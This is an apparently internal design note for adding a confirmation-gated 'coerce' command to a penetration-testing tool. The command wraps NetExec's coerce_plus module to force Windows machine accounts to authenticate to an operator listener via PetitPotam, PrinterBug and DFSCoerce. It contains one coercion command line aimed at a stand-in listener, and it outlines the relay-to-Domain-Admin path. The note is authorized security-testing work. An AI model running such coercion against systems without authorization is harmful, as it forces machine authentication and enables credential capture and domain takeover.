# Coercion (PetitPotam / PrinterBug / DFSCoerce) - design note

> Status: **PLANNED** (feat/offensive-actions family; docs/ROADMAP.md Tier 2 - parity;
> last item of issue #49). Owner: **anjaiv** (engines/CLI lane). Read `CLAUDE.md`,
> `docs/DECISIONS.md`, `docs/NETNTLM.md` (the `poison`/`trigger` capture pipeline this
> feeds), and `docs/SPRAY.md` + `redness/poison.py` (the gated-command precedent) first,
> then this.

## What it is (and why it's a gated command, not an engine)
Active **RPC forced-authentication**: send an RPC call to a target (usually a DC or a
Windows server) over **MS-EFSR** (PetitPotam), **MS-RPRN** (PrinterBug), or **MS-DFSNM**
(DFSCoerce) that makes the *target's machine account* authenticate to a listener we
control - immediately, no human, no waiting. Because it **actively touches a target over
RPC** it is intrusive: exactly like `poison`/`spray`, it is an **opt-in,
confirmation-gated CLI command that NEVER runs as part of `scan`** and is NOT in
`default_engines()`. Contrast `gpp`/`remote`, which are read-only and default-on.

## Where it sits in the NetNTLMv2 family (docs/NETNTLM.md)
Three ways to make something authenticate to us; all feed the *same* capture pipeline:

| | `poison` (built) | `trigger` (built) | **`coerce` (this)** |
|---|---|---|---|
| mechanism | LLMNR/NBT-NS poisoning | file lure (html/scf/url) | **active RPC** (EFSR/RPRN/DFSNM) |
| victim | whoever resolves a name | a **human** opens a file | a **machine account**, forced now |
| we initiate? | passive listen | passive (out-of-band delivery) | **active - RPC to the target** |
| wraps a tool? | Responder | none (pure stdlib) | **yes (nxc `coerce_plus`)** |
| captures the hash? | **yes** | no (`poison` does) | no (`poison` does) |

So `coerce` is a **trigger** (like `trigger.py`) - it *causes* an authentication but does
**not** capture it. It differs from `trigger.py` in being an **active RPC against a machine**
(intrusive, wraps a tool, forces a computer account immediately) rather than a passive file a
human must open.

## Approach: orchestrate nxc, don't reimplement
Wrap NetExec's **`coerce_plus`** module - one module that bundles PetitPotam / PrinterBug /
DFSCoerce / ShadowCoerce / MS-EVEN and has a check mode:

```
nxc smb <target> -u U -p P -M coerce_plus -o LISTENER=<us> [-o METHOD=PetitPotam]
```

House pattern (mirrors `gpp`'s `-M gpp_password`), Kali-native, already covered by
`redness doctor`'s netexec check. Alternatives considered and rejected: standalone
**Coercer**, impacket `PetitPotam.py`/`dfscoerce.py` - several tools vs one module.

> **Verify against real nxc.** The exact module name/option keys (`coerce_plus`, `LISTENER`,
> `METHOD`) could not be introspected in-sandbox (nxc has no py3.12 wheel; not installable
> here). The **pure parser is the tested core**; the thin invoker gets a "verify on Kali"
> note, same as `gpp`/`spray`. If the module/flags differ, only `coerce_argv()` changes.

Parsing is pure (`parse_coerce_plus`) and separate from the gated orchestration, so it
unit-tests against captured nxc output with no nxc/DC - like `engines/responder.py` vs
`poison.py`.

## How it plugs into the capture flow: it needs a listener already running
Coercion **delivers** an authentication to whatever IP we pass as `LISTENER`; it does **not**
capture. So the operator runs the existing gated **`redness poison`** (Responder) at
`--listener <us>` first, then fires `redness coerce --target <dc> --listener <us>`. The
coerced NetNTLMv2 lands in that Responder listener and flows through the **identical existing
pipeline**: `parse_responder_log` -> `build_findings` (`netntlm-captured`) -> `crack.py`
(`netntlmv2`). This mirrors the `trigger`/`poison` split exactly - `coerce` fires the RPC,
`poison` captures.

- **No LLMNR/NBT-NS poisoning needed** (like `trigger`): coercion delivers auth straight to
  `LISTENER`. The poisoning-off `--capture-only` listen mode deferred in docs/NETNTLM.md would
  be the *cleaner* pairing for both `trigger` and `coerce`; until it lands, pair with full
  `poison`.
- **Capture stays a separate command** (`coerce` does not spawn Responder) - same clean seam
  the NetNTLM docs established. An integrated `--capture` (start listener + coerce in one) is a
  possible later enhancement, **deferred**.

## The honest limitation: capture-only, no relay
Coercion's real payoff is **relay** (coerce `DC$` -> relay to LDAP / **ADCS ESC8** -> Domain
Admin), which REDNESS **deliberately does not do** (docs/NETNTLM.md; docs/ROADMAP.md "Not
doing"). Capture-only coercion of a DC yields a **machine-account** NetNTLMv2 (`DC01$`) whose
password is random ~120 chars - **not crackable**. So this feature's deliverable is
**detecting and demonstrating the coercion vulnerability** (a legit, PingCastle-grade report
finding), *not* obtaining a usable credential. The captured hash is **proof-of-coercion**, not
loot. This is consistent with the relay decision: we surface the finding, we don't weaponize
it.

## Findings to emit
`coerce` emits the **vulnerability** findings; the captured-hash finding (`netntlm-captured`,
HIGH) still comes from the `poison` listener, not from here.

| id | severity | when | remediation (per-vector) |
|----|----------|------|--------------------------|
| `coercion-petitpotam` | **CRITICAL** if target is a DC, else **HIGH** | MS-EFSR coerced auth succeeded | patch KB5005413 + EFSRPC filtering; SMB signing + LDAP channel-binding/EPA |
| `coercion-printerbug` | **CRITICAL** if DC, else **HIGH** | MS-RPRN (spooler) coerced | disable the Print Spooler on DCs/servers |
| `coercion-dfscoerce` | **CRITICAL** if DC, else **HIGH** | MS-DFSNM coerced | apply DFS coercion patches; signing/EPA |
| `coercion-shadowcoerce` *(optional)* | **HIGH** | MS-FSRVP coerced | disable VSS-over-SMB / FSRVP |

**Per-vector ids** (not one aggregated `coercion-possible`) because the remediation genuinely
differs per vector - a spooler-disable does not fix PetitPotam. Evidence on each carries the
method + the `LISTENER` IP the auth hit. **DC targets are CRITICAL**: coercing `DC$` is the
relay->ADCS-ESC8/LDAP->DA primitive - the reason these CVEs are severe - even though we don't
relay; non-DC hosts are HIGH. All reuse **`Category.CONFIG`** - **no `findings.py` schema
change / no `SCHEMA_VERSION` bump**. **No `meta["credentials"]`** (coerce recovers no usable
credential). **References:** MITRE **T1187** (Forced Authentication) + the per-vector CVEs.

## Safety / gating (CLI double-gate, network-level - not the HTTP arm/confirm)
This is an **operator-run CLI command** (like `poison`/`spray`/`trigger`), not a right-click
node action, so it uses the **CLI gate**, not the GUI `/action` arm/confirm channel (that
exists for browser-triggered node actions with no TTY). Same shape as `spray`:

- **Credentialed run (normal path):** authorization banner naming target + listener ->
  `Type YES to coerce <target> to authenticate to <listener>` -> `--yes` to script (banner
  still prints to **stderr** in scripted mode).
- **Uncredentialed run (no `-u/-p`, relying on an unpatched target):** this is the riskier,
  less-reliable mode and is **refused unless `--force`**; overriding requires a **second,
  distinct typed confirmation naming the danger** (unknown patch state / may not land), which
  `--yes` never skips - exactly `spray`'s `--force` double-gate. (Coercion has no lockout math,
  so the `--force` gate guards the *uncredentialed* path rather than a lockout budget.)
- **Interface/target-scoped:** `--target` and `--listener` required; the coerced auth only
  goes to `--listener`.
- Print the **authorization banner** (authorized, in-scope engagements only) every run.

## Structure (mirrors `poison`/`spray`)
- **`redness/engines/coerce.py`** - pure `parse_coerce_plus(stdout) -> [(method, coerced?)]`,
  `build_findings(results, target, is_dc)`, `coerce_argv(...)` (no `Engine` subclass, not a
  default engine).
- **`redness/coerce.py`** - `run_coerce()`: fire nxc `coerce_plus` -> parse -> build
  `coercion-*` `Finding`s -> `Report`; stream to the `EventBus` (target node, edge labeled
  "coerced", findings as they land). Injectable runner (testable), optional `--live`.
- **`cmd_coerce`** in `redness/cli.py` - args `--target`, `--listener`, auth (`-u/-p/-d/-H/-k`),
  `--method {petitpotam,printerbug,dfscoerce,all}` (default all), `--out/--json/--live`;
  banner + `Type YES` confirmation + `--yes`/`--force` (double-gate for the uncredentialed
  path).

## Dependencies
- **nxc** (Kali-native; already covered by `redness doctor`'s netexec check). A one-line
  `coerce` hint in `doctor` (reusing the netexec check). No crypto, no new dependency.
- A **listener** (`redness poison` / Responder) running at `--listener` to catch the auth -
  operator-run, same as `trigger`.

## Build order (suggested)
1. Pure parser + findings: `parse_coerce_plus`, `build_findings` (+ `coerce_argv`). Tests
   against captured `-M coerce_plus` output (DC->CRITICAL, non-DC->HIGH, per-vector ids, no
   coercion->no findings). **No nxc/DC.**
2. `run_coerce()` orchestrator (gated, injectable runner) + `cmd_coerce` + argparse wiring +
   the confirmation banner and `--force` double-gate for the uncredentialed path; `doctor`
   hint.
3. Docs: DECISIONS entry (per-vector ids, CONFIG reuse, capture-only/no-relay, `--capture-only`
   pairing as a follow-up), ROADMAP Tier-2 tick, CLAUDE.md.

## Legal / ethics
Coercion actively forces **another machine** (often a DC) to authenticate to us over RPC. Run
only against targets you are **explicitly authorized** to test, within the agreed scope and
window. It is active exploitation, not enumeration; treat it accordingly.
